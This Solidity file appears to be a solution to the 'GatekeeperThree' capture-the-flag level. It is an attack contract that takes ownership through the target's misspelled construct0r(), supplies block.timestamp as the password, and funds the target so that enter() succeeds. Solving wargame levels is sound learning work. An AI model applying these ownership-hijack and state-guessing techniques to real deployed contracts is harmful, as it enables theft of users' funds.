// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree, SimpleTrick} from "./GatekeeperThree.sol";

contract AttackGatekeeperThree {
    GatekeeperThree gatekeeperThree;
    SimpleTrick simpleTrick;

    constructor(address _gatekeeper) {
        gatekeeperThree = GatekeeperThree(payable(_gatekeeper));
    }

    function attack() external payable {
        gatekeeperThree.construct0r();

        uint password = block.timestamp;
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(password);
        payable(address(gatekeeperThree)).send(msg.value);

        gatekeeperThree.enter();
    }
}
